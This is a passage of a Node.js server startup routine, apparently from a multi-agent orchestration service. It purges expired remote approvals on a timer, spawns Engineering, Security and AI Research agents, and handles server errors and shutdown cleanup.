  const REMOTE_APPROVALS = (() => { try { return require('./lib/remote-approvals'); } catch { return null; } })();
  if (REMOTE_APPROVALS && REMOTE_APPROVALS.purgeExpired) {
    const purged = REMOTE_APPROVALS.purgeExpired();
    safeLog('API', `purgeExpired: removed ${purged} expired approvals`);
    // Re-purge every 5 minutes
    setInterval(() => {
      try {
        const n = REMOTE_APPROVALS.purgeExpired();
        if (n > 0) safeLog('API', `purgeExpired: removed ${n} expired approvals`);
      } catch (e) { console.warn('[UNIFIED API] purgeExpired error:', e && e.message ? e.message : String(e)); }
    }, 5 * 60 * 1000);
  }
  setTimeout(() => { spawnDivisionAgent('Engineering', 'Initialize system'); spawnDivisionAgent('Security', 'Monitor system'); spawnDivisionAgent('AI Research', 'Analyze patterns'); safeLog('API', 'Swarm initialized'); }, 1000);
});

server.on('error', (err) => { console.error('[UNIFIED API] Server error:', err.message); });

process.on('SIGINT', () => { if (hb) clearInterval(hb); if (rc) clearTimeout(rc); ws?.close(); if (purpProc) purpProc.kill(); if (pwBrowser) pwBrowser.close().catch(() => {}); process.exit(0); });
